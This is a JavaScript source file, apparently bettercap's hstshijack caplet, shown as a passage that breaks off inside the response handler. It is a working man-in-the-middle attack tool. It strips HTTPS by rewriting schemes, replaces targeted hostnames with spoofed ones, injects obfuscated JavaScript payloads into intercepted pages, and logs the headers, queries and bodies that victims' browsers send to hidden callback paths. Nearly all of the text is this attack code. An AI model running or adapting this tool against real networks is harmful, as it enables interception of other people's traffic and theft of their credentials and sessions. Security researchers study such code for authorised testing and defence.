/*
 * Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 */

var ssl = {
  "domains": [],
  "index": {},
  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz"
};

var payload,
    payload_container_prefix = (
      "if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
         "globalThis.{{SESSION_ID_TAG}} = function() {\n"),
    payload_container_suffix = (
         "\n}\n" +
         "globalThis.{{SESSION_ID_TAG}}();\n" +
      "}\n");

var ignore_hosts       = [],
    target_hosts       = [],
    replacement_hosts  = [],
    block_script_hosts = [];

var payloads = {},
    obfuscate;

var callback_path,
    whitelist_path,
    ssl_index_path,
    session_id,
    varname_target_hosts,
    varname_replacement_hosts;

var math_seed;

var whitelist = {};

var red      = "\033[31m",
    yellow   = "\033[33m",
    green    = "\033[32m",
    blue     = "\033[34m",
    on_white = "\033[47;30m",
    on_grey  = "\033[40;37m",
    on_blue  = "\033[104;30m",
    bold     = "\033[1;37m",
    reset    = "\033[0m";

function randomFloat() {
  r = Math.sin(math_seed++) * 10000;
  return r - Math.floor(r);
}

function randomString(length) {
  length = parseInt(length);
  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
      buff  = new Array(length);
  for (var a = 0; a < buff.length; a++) {
    index = parseInt(Math.random() * chars.length);
    buff[a] = chars.charAt(index)
  }
  return buff.join("");
}

function toRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(/\./g, "\\.");
  selector_string = selector_string.replace(/\-/g, "\\-");
  return [
    new RegExp("(^|[^a-z0-9-.])" + selector_string + "($|[^a-z0-9-.])", "ig"),
    "$1" + replacement_string + "$2"
  ];
}

function toWholeRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(/\./g, "\\.");
  selector_string = selector_string.replace(/\-/g, "\\-");
  return [
    new RegExp("^" + selector_string + "$", "ig"),
    replacement_string
  ];
}

function toWildcardRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(/\-/g, "\\-");
  if (selector_string.match(/^\*./)) {
    selector_string = selector_string.replace(/^\*\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
    selector_string = selector_string.replace(/\./g, "\\.");
    replacement_string = replacement_string.replace(/^\*\./, "");
    return [
      new RegExp(selector_string, "ig"),
      "$1" + replacement_string
    ];
  } else if (selector_string.match(/\.\*$/)) {
    selector_string = selector_string.replace(/\.\*$/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
    selector_string = selector_string.replace(/\./g, "\\.");
    replacement_string = replacement_string.replace(/\.\*$/, "");
    return [
      new RegExp(selector_string, "ig"),
      replacement_string + "$1"
    ];
  } else {
    log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").");
  }
}

function toWholeWildcardRegexp(selector_string, replacement_string) {
  selector_string = selector_string.replace(/\-/g, "\\-");
  if (selector_string.match(/^\*./)) {
    selector_string = selector_string.replace(/^\*\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
    selector_string = selector_string.replace(/\./g, "\\.");
    replacement_string = replacement_string.replace(/^\*\./, "");
    return [
      new RegExp("^" + selector_string + "$", "ig"),
      "$1" + replacement_string
    ];
  } else if (selector_string.match(/\.\*$/)) {
    selector_string = selector_string.replace(/\.\*/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
    selector_string = selector_string.replace(/\./g, "\\.");
    replacement_string = replacement_string.replace(/\.\*$/, "");
    return [
      new RegExp(selector_string, "ig"),
      replacement_string + "$1"
    ];
  } else {
    log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").");
  }
}

/* Matches /(^|[^a-z0-9-.])example\.com($|[^a-z0-9-.])/ig */
function toRegexpSet(selector_string, replacement_string) {
  if (selector_string.indexOf("*") != -1) {
    return toWildcardRegexp(selector_string, replacement_string);
  } else {
    return toRegexp(selector_string, replacement_string);
  }
}

/* Matches ^example.com$ */
function toWholeRegexpSet(selector_string, replacement_string) {
  if (selector_string.indexOf("*") != -1) {
    return toWholeWildcardRegexp(selector_string, replacement_string);
  } else {
    return toWholeRegexp(selector_string, replacement_string);
  }
}

/* Saves the list of domains using SSL, as well as its index ranges. */
function saveSSLIndex() {
  writeFile(env["hstshijack.ssl.domains"], ssl.domains.join("\n"));
  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index, null, 2));
}

/* Returns the amount of characters of an identical prefix of two given strings. */
function getMatchingPrefixLength(string1, string2) {
  count = 0;
  if (string1.length > string2.length) {
    for (a = 0; a < string2.length; a++) {
      if (string1.charAt(a) != string2.charAt(a)) {
        break;
      }
      count++;
    }
  } else {
    for (a = 0; a < string1.length; a++) {
      if (string1.charAt(a) != string2.charAt(a)) {
        break;
      }
      count++;
    }
  }
  return count;
}

/* Returns true if domain1 gets alphanumeric precendence over domain2. */
function getsPrecedence(domain1, domain2) {
  if (domain1.length > domain2.length) {
    /* If the first given domain is longer than the second. */
    for (a = 0; a < domain2.length; a++) {
      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
      if (rank1 > rank2) {
        return false;
      } else if (rank1 < rank2) {
        return true;
      }
    }
    return false;
  } else {
    /* If the second given domain is longer than the first. */
    for (a = 0; a < domain1.length; a++) {
      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
      if (rank1 > rank2) {
        return false;
      } else if (rank1 < rank2) {
        return true;
      }
    }
    return true;
  }
}

/* Returns an array with the first and last index of an alphanumeric range of domains.
 * This is the range in which domains are/will be indexed. */
function getIndexRange(char) {
  if (index_range = ssl.index[char]) {
    /* Character is already indexed. */
    return index_range;
  } else {
    /* Character is not yet indexed. */
    indexed_chars = Object.keys(ssl.index).concat(char).sort();
    this_char_index = indexed_chars.indexOf(char);
    if (
         indexed_chars[this_char_index - 1]
      && indexed_chars[this_char_index + 1]
    ) {
      /* Will not be the first nor last indexed character. */
      return [
        ssl.index[indexed_chars[this_char_index + 1]][0],
        ssl.index[indexed_chars[this_char_index + 1]][0]
      ];
    } else if (indexed_chars[this_char_index + 1]) {
      /* Will be the first indexed character, but not the last. */
      return [
        0,
        ssl.index[indexed_chars[this_char_index + 1]][0]
      ];
    } else if (indexed_chars[this_char_index - 1]) {
      /* Will be the last indexed character, but not the first. */
      if (ssl.domains.length == 1) {
        /* Will be the second and last indexed character. */
        return [
          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
          1
        ];
      } else {
        /* Will be the last but not the second indexed character. */
        return [
          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
          ssl.domains.length
        ];
      }
    } else {
      /* Will be the first and last indexed character. */
      return [0, 0];
    }
  }
}

/* Returns the index of a given domain within a given index range. */
function getDomainIndex(domain, index_range) {
  domain = domain.toLowerCase();
  if (
       index_range[0] == index_range[1]
    && domain === ssl.domains[index_range[0]]
  ) {
    /* This domain is the only indexed domain with this first character. */
    return index_range[0];
  }
  /* Return this domain's index when found in this index range. */
  for (a = index_range[0]; a < index_range[1] + 1; a++) {
    if (domain === ssl.domains[a]) {
      return a;
    }
  }
  /* This domain is not indexed. */
  return -1;
}

/* Index a new domain. */
function indexDomain(domain) {
  domain = domain.toLowerCase();
  first_char = domain.charAt(0);
  index_range = getIndexRange(first_char);
  if (getDomainIndex(domain, index_range) == -1) {
    /* This domain is not indexed yet. */
    log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");
    indexed_chars = Object.keys(ssl.index);
    if (index_range[0] == index_range[1]) {
      /* This index range consists of only one index. */
      if (ssl.domains[index_range[0]]) {
        /* This index range contains one domain. */
        new_index = index_range[0];
        if (getsPrecedence(ssl.domains[index_range[0]], domain)) {
          new_index++;
        }
        arr_ = ssl.domains.slice(0, new_index);
        _arr = ssl.domains.slice(new_index, ssl.domains.length);
        ssl.domains = [].concat(arr_, [domain], _arr);
        ssl.index[first_char] = [
          index_range[0],
          index_range[1] + 1
        ];
      } else {
        /* This index range contains no domains. */
        ssl.domains.push(domain);
        ssl.index[first_char] = [
          index_range[0],
          index_range[1]
        ];
      }
    } else {
      /* This index range consists of multiple domains. */
      new_index = index_range[0];
      for (var a = index_range[0]; a < index_range[1] + 1; a++) {
        if (!getsPrecedence(domain, ssl.domains[a])) {
          new_index = a + 1;
        } else {
          break;
        }
      }
      arr_ = ssl.domains.slice(0, new_index);
      _arr = ssl.domains.slice(new_index, ssl.domains.length);
      ssl.domains = [].concat(arr_, [domain], _arr);
      ssl.index[first_char] = [
        index_range[0],
        index_range[1] + 1
      ];
    }
    remaining_indexed_chars = indexed_chars.slice(index_range[1] + 1);
    for (a = 0; a < remaining_indexed_chars.length; a++) {
      indexed_char = remaining_indexed_chars[a];
      index_range = ssl.index[indexed_char];
      ssl.index[indexed_char] = [
        index_range[0] + 1,
        index_range[1] + 1
      ];
    }
    saveSSLIndex();
  } else {
    /* This domain is already indexed. */
    log_debug(on_blue + "hstshijack" + reset + " Skipped already indexed domain " + bold + domain + reset);
  }
}

function configure() {
  /* Read caplet. */
  env["hstshijack.ignore"]
    ? ignore_hosts = env["hstshijack.ignore"].replace(/\s/g, "").split(",")
    : ignore_hosts = [];
  env["hstshijack.targets"]
    ? target_hosts = env["hstshijack.targets"].replace(/\s/g, "").split(",")
    : target_hosts = [];
  env["hstshijack.replacements"]
    ? replacement_hosts = env["hstshijack.replacements"].replace(/\s/g, "").split(",")
    : replacement_hosts = [];
  env["hstshijack.blockscripts"]
    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")
    : block_script_hosts = [];
  env["hstshijack.obfuscate"]
    ? obfuscate = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()
    : obfuscate = false;

  /* Validate caplet. */
  if (target_hosts.length < replacement_hosts.length) {
    log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").");
  }
  if (target_hosts.length > replacement_hosts.length) {
    log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").");
  }
  if (target_hosts.indexOf("*") != -1) {
    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).");
  }
  if (replacement_hosts.indexOf("*") != -1) {
    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).");
  }

  whole_prefix_wildcard_domain_selector = /^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i;
  whole_suffix_wildcard_domain_selector = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i;
  for (a = 0; a < ignore_hosts.length; a++) {
    if (
         !ignore_hosts[a].match(/^\*$/i)
      && !ignore_hosts[a].match(whole_prefix_wildcard_domain_selector)
      && !ignore_hosts[a].match(whole_suffix_wildcard_domain_selector)
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");
    }
  }

  for (a = 0; a < target_hosts.length; a++) {
    if (
         !target_hosts[a].match(whole_prefix_wildcard_domain_selector)
      && !target_hosts[a].match(whole_suffix_wildcard_domain_selector)
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");
    }

    if (
         !replacement_hosts[a].match(whole_prefix_wildcard_domain_selector)
      && !replacement_hosts[a].match(whole_suffix_wildcard_domain_selector)
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");
    }

    if (target_hosts[a].match(/\*/g) || replacement_hosts[a].match(/\*/g)) {
      target_host_wildcard_count      = target_hosts[a].match(/\*/g).length      || 0;
      replacement_host_wildcard_count = replacement_hosts[a].match(/\*/g).length || 0;
      if (target_host_wildcard_count != replacement_host_wildcard_count) {
        log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[a] + " and " + replacement_hosts[a] + ").");
      }
    }
  }

  for (a = 0; a < block_script_hosts.length; a++) {
    if (
         !block_script_hosts[a].match(/^\*$/i)
      && !block_script_hosts[a].match(whole_prefix_wildcard_domain_selector)
      && !block_script_hosts[a].match(whole_suffix_wildcard_domain_selector)
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");
    }
  }

  if (obfuscate == "true") {
    obfuscate = true;
  } else {
    obfuscate = false;
  }

  /* Prepare payloads. */
  env["hstshijack.payloads"]
    ? payload_entries = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
    : payload_entries = [];

  for (a = 0; a < payload_entries.length; a++) {
    if (
         !payload_entries[a].match(/^\*:.+$/i)
      && !payload_entries[a].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i)
      && !payload_entries[a].match(whole_suffix_wildcard_domain_selector)
    ) {
      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");
    }

    payload_host = payload_entries[a].replace(/[:].*/, "");
    payload_path = payload_entries[a].replace(/.*[:]/, "");

    payload = "";
    if (!(payload = readFile(payload_path))) {
      log_fatal(on_blue + "hstshijack" + reset + " Could not read a payload (got " + payload_path + ").");
    } else {
      payload = payload
        .replace(/obf_var_target_hosts/g, varname_target_hosts)
        .replace(/obf_var_replacement_hosts/g, varname_replacement_hosts)
        .replace(/obf_path_callback/g, callback_path)
        .replace(/obf_path_ssl_index/g, ssl_index_path)
        .replace(/obf_path_whitelist/g, whitelist_path);

      if (obfuscate) {
        obfuscation_variables = payload.match(/obf_[a-z0-9_]*/ig) || [];
        for (b = 0; b < obfuscation_variables.length; b++) {
          if (obfuscation_variables.indexOf(obfuscation_variables[b]) === b) {
            regexp = new RegExp(obfuscation_variables[b], "g");
            payload = payload.replace(regexp, randomString(8 + (Math.random() * 8)));
          }
        }
      }

      if (payloads[payload_host]) {
        payloads[payload_host] = payloads[payload_host] + "\n" + payload + "\n";
      } else {
        payloads[payload_host] = payload + "\n";
      }
    }
  }

  /* Prepare payload container */
  payload_container_prefix = payload_container_prefix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
  payload_container_prefix = payload_container_prefix +
    "var " + varname_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"];\n" +
    "var " + varname_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"];\n";
  payload_container_suffix = payload_container_suffix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);

  /* Prepare SSL index */
  ssl_index_check = env["hstshijack.ssl.check"].toLowerCase() || "true";
  all_domains = readFile(env["hstshijack.ssl.domains"]).split("\n");
  if (all_domains.length == 0) {
    log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");
  } else {
    if (ssl_index_check != "false") {
      log_info(on_blue + "hstshijack" + reset + " Indexing SSL domains ...");
      all_domains
        .sort()
        .filter(function(domain, index, arr){
          if (domain !== "" && arr.indexOf(domain) === index) {
            indexDomain(domain);
          }
        });
    } else {
      ssl.domains = all_domains;
      index_file_contents = readFile(env["hstshijack.ssl.index"]);
      if (ssl.domains.length != 0 && index_file_contents == "") {
        log_fatal(on_blue + "hstshijack" + reset + " List of domains using SSL is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
      }
      ssl.index = JSON.parse(index_file_contents);
      log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");
    }
  }

  /* Ensure targeted hosts are in SSL log (no wildcards). */
  for (var a = 0; a < target_hosts.length; a++) {
    if (target_hosts[a].indexOf("*") === -1) {
      indexDomain(target_hosts[a]);
    }
  }

  saveSSLIndex();
  log_info(on_blue + "hstshijack" + reset + " Indexed " + ssl.domains.length + " domains.");
}

function showConfig() {
  /* Print module configuration. */
  logStr  = "\n";
  logStr += "  " + bold + "Caplet" + reset + "\n";
  logStr += "\n";
  logStr += "    " + yellow + " hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (env["hstshijack.ssl.check"].match(/^true$/i) ? green + "true" : red + "false") + reset + "\n";
  logStr += "    " + yellow + "      hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "     hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "hstshijack.blockscripts" + reset + " > " + (env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined") + reset + "\n";
  logStr += "    " + yellow + "   hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\n";
  logStr += "    " + yellow + "    hstshijack.payloads" + reset + " > ";
  if (env["hstshijack.payloads"]) {
    list = env["hstshijack.payloads"].replace(/\s/g, "").split(",");
    logStr += green + list[0] + reset + "\n";
    if (list.length > 1) {
      for (a = 1; a < list.length; a++) {
        logStr += "                            > " + green + list[a] + reset + "\n";
      }
    }
  } else {
    logStr += red + "undefined" + reset + "\n";
  }
  logStr += "\n";
  logStr += "  " + bold + "Commands" + reset + "\n";
  logStr += "\n";
  logStr += "    " + bold + "       hstshijack.show" + reset + " : Show module info.\n";
  logStr += "    " + bold + "hstshijack.ssl.domains" + reset + " : Show recorded domains with SSL.\n";
  logStr += "    " + bold + "  hstshijack.ssl.index" + reset + " : Show SSL domain index.\n";
  logStr += "\n";
  logStr += "  " + bold + "Session info" + reset + "\n";
  logStr += "\n";
  logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\n";
  logStr += "    " + bold + " Callback path" + reset + " : " + callback_path + "\n";
  logStr += "    " + bold + "Whitelist path" + reset + " : " + whitelist_path + "\n";
  logStr += "    " + bold + "SSL index path" + reset + " : " + ssl_index_path + "\n";
  logStr += "    " + bold + "   SSL domains" + reset + " : " + ssl.domains.length + " domain" + (ssl.domains.length == 1 ? "" : "s") + "\n";
  console.log(logStr);
}

function onCommand(cmd) {
  if (cmd == "hstshijack.show") {
    showConfig();
    return true;
  }
  if (cmd == "hstshijack.ssl.domains") {
    if (ssl.domains.length > 20) {
      log_string = ssl.domains.slice(0, 20).push("...").join(reset + "\n    " + yellow);
      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + log_string + reset + "\n");
    } else {
      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + ssl.domains.join(reset + "\n    " + yellow) + reset + "\n");
    }
    return true;
  }
  if (cmd == "hstshijack.ssl.index") {
    log_string = "\n" + bold + "  SSL domain index (" + Object.keys(ssl.index).length + ")" + reset + "\n";
    for (a = 0; a < Object.keys(ssl.index).length; a++) {
      indexed_char = Object.keys(ssl.index)[a];
      char_index = ssl.index[indexed_char];
      log_string += "\n    " + yellow + indexed_char + reset + " (first: " + char_index[0] + ", last: " + char_index[1] + ")";
    }
    console.log(log_string + "\n");
    return true;
  }
}

function onLoad() {
  math_seed = new Date().getMilliseconds();
  Math.random = function() {
    return randomFloat();
  }

  log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");
  session_id                = randomString(8 + Math.random() * 8);
  varname_target_hosts      = randomString(8 + Math.random() * 8);
  varname_replacement_hosts = randomString(8 + Math.random() * 8);
  callback_path             = "/" + randomString(8 + Math.random() * 8);
  whitelist_path            = "/" + randomString(8 + Math.random() * 8);
  ssl_index_path            = "/" + randomString(8 + Math.random() * 8);

  log_info(on_blue + "hstshijack" + reset + " Reading caplet ...");
  configure();
  log_info(on_blue + "hstshijack" + reset + " Module loaded.");
  showConfig();
}

function onRequest(req, res) {
  if (req.Path == ssl_index_path) {
    /*
      SSL callback.

      Requests made for this path should include a hostname in the query so
      this module can send a HEAD request to learn HTTPS redirects.
    */
    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.IP + reset + " for " + bold + req.Query + reset + ".");
    queried_host = req.Query;
    if (getDomainIndex(queried_host, getIndexRange(queried_host.charAt(0))) == -1) {
      log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");
      req.Hostname = queried_host;
      req.Path     = "/";
      req.Query    = "";
      req.Body     = "";
      req.Method   = "HEAD";
    }
  } else if (req.Path == callback_path) {
    /*
      Basic callback.

      Requests made for this path will be dropped.
      Requests made for this path will be printed.
    */
    req.Scheme = "ignore";
    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n";
    logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n";
    headers = req.Headers.split("\r\n");
    for (i = 0; i < headers.length; i++) {
      if (headers[i].split(": ").length == 2) {
        params = headers[i].split(": ");
        logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
      } else {
        logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n";
      }
    }
    logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n";
    queries = req.Query.split("&");
    for (i = 0; i < queries.length; i++) {
      if (queries[i].split("=").length == 2) {
        params = queries[i].split("=");
        logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
      } else {
        logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n";
      }
    }
    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
    log_info(logStr);
  } else if (req.Path == whitelist_path) {
    /*
      Whitelisting callback.

      Requests made for this path will be dropped.
      Requests made for this path will be printed.
      Requests made for this path will stop all attacks towards this client with the requested hostname.
    */
    req.Scheme = "ignore";
    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n";
    logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n";
    headers = req.Headers.split("\n");
    for (i = 0; i < headers.length; i++) {
      if (headers[i].split(": ").length == 2) {
        params = headers[i].split(": ");
        logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
      } else {
        logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n";
      }
    }
    logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n";
    queries = req.Query.split("&");
    for (i = 0; i < queries.length; i++) {
      if (queries[i].split("=").length == 2) {
        params = queries[i].split("=");
        logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
      } else {
        logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n";
      }
    }
    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
    log_info(logStr);

    /* Add requested hostname to whitelist. */
    if (whitelist[req.Client.IP]) {
      if (whitelist[req.Client.IP].indexOf(req.Hostname) == -1) {
        whitelist[req.Client.IP].push(req.Hostname);
      }
    } else {
      whitelist[req.Client.IP] = [req.Hostname];
    }
    /* Also whitelist spoofed version of requested hostname. */
    for (a = 0; a < target_hosts.length; a++) {
      if (target_hosts[a].indexOf("*") == -1) {
        selector_target = toWholeRegexpSet(target_hosts[a], "")[0];
        selector_replacement = toWholeRegexpSet(replacement_hosts[a], "")[0];
        if (
             req.Hostname.match(selector_target)
          || req.Hostname.match(selector_replacement)
        ) {
          if (whitelist[req.Client.IP].indexOf(target_hosts[a]) == -1) {
            whitelist[req.Client.IP].push(target_hosts[a]);
          }
          if (whitelist[req.Client.IP].indexOf(replacement_hosts[a]) == -1) {
            whitelist[req.Client.IP].push(replacement_hosts[a]);
          }
          break;
        }
      }
    }
  } else {
    /*
      Not a callback.

      Redirect client to the real host if a whitelist callback was received previously.
      Restore spoofed hostnames and schemes in request.
    */
    if (whitelist[req.Client.IP]) {
      for (a = 0; a < whitelist[req.Client.IP].length; a++) {
        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.IP][a], "");
        if (req.Hostname.match(whole_regexp_set[0])) {
          /* Restore requested hostname if it was spoofed. */
          var unspoofed_host;
          for (b = 0; b < replacement_hosts.length; b++) {
            whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b]);
            if (req.Hostname.match(whole_regexp_set[0])) {
              unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
              query = (req.Query != "" ? ("?" + req.Query) : "");
              res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
              res.Status = 301;
              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
              return;
            }
          }
        }
      }
    }

    /* Restore original hostnames. */
    for (a = 0; a < target_hosts.length; a++) {
      /* Restore original hostnames in headers. */
      regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);
      if (req.Headers.match(regexp_set[0])) {
        req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);
        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
      }

      /* Restore original hostname of request. */
      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])
      if (req.Hostname.match(whole_regexp_set[0])) {
        spoofed_host = req.Hostname;
        req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
        req.Scheme   = "https";
        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + spoofed_host + reset + " to " + req.Hostname + " and restored HTTPS scheme.");
      }
    }

    /* Restore HTTPS scheme. */
    if (getDomainIndex(req.Hostname, getIndexRange(req.Hostname.charAt(0))) != -1) {
      /* Restore HTTPS scheme of request if domain is indexed. */
      if (req.Scheme != "https") {
        req.Scheme = "https";
        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + bold + req.Hostname + reset + ".");
      }
      /* Restore HTTPS scheme in request headers if domains are indexed. */
      escaped_domain = req.Hostname.replace(/\./g, "\\.").replace(/\-/g, "\\-");
      regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
      if (req.Headers.match(regexp)) {
        req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
      }
    } else { /* If requested domain is not indexed. */
      log_debug(on_blue + "hstshijack" + reset + " Domain " + bold + req.Hostname + reset + " is not indexed.");
      if (req.Scheme != "https") {
        for (b = 0; b < target_hosts; b++) {
          /* Restore HTTPS scheme of request if domain is targeted. */
          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");
          if (req.Hostname.match(whole_regexp_set[0])) {
            req.Scheme = "https";
            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");
            break;
          }
          /* Restore HTTPS scheme in request headers if domains are targeted. */
          regexp_set = toRegexpSet(target_hosts[b], "");
          matches = req.Headers.match(regexp);
          for (c = 0; c < matches.length; c++) {
            escaped_domain = matches[c].replace(/\./g, "\\.").replace(/\-/g, "\\-");
            regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
            req.Headers = req.Headers.replace(regexp, "https://" + matches[c] + "$1");
            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
          }
        }
      }
    }
  }
}

function onResponse(req, res) {
  /* Remember HTTPS redirects. */
  location = res.GetHeader("Location", "");
  if (location.match(/^https:\/\//i)) {
    host = location.replace(/https:\/\/([^:/?#]*).*/i, "$1");
    if (host != "") {
      indexDomain(host);
